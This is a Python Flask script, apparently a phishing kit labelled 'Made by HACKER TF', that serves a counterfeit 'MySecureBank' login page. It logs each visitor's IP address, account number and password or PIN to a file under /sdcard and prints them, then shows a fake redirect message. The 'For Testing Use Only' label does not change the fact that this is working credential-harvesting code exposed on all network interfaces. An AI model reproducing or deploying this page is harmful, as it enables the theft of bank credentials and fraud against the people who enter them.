from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>MySecureBank - Internet Banking</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f2f2f2; text-align: center; padding-top: 60px; }
        .box { background: white; padding: 30px; width: 350px; margin: auto; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
        input, button { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
        button { background: #007bff; color: white; font-weight: bold; border: none; cursor: pointer; }
        img { width: 80px; margin-bottom: 20px; }
        .footer { font-size: 12px; margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png">
        <h2>MySecureBank Login</h2>
        <form method="POST" action="/login">
            <input type="text" name="account" placeholder="Account Number or Email" required><br>
            <input type="password" name="password" placeholder="Password or PIN" required><br>
            <button type="submit">Login Securely</button>
        </form>
    </div>
    <div class="footer">
        Made by HACKER TF - For Testing Use Only
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    account = request.form.get('account')
    password = request.form.get('password')
    ip = request.remote_addr

    log = f"""
[+] MySecureBank Login
IP: {ip}
Account: {account}
Password/PIN: {password}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Redirecting to dashboard...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;32m" + "="*45)
    print("         Made by HACKER TF - MySecureBank")
    print("        Bank Login Testing Simulation Tool")
    print("="*45 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5003)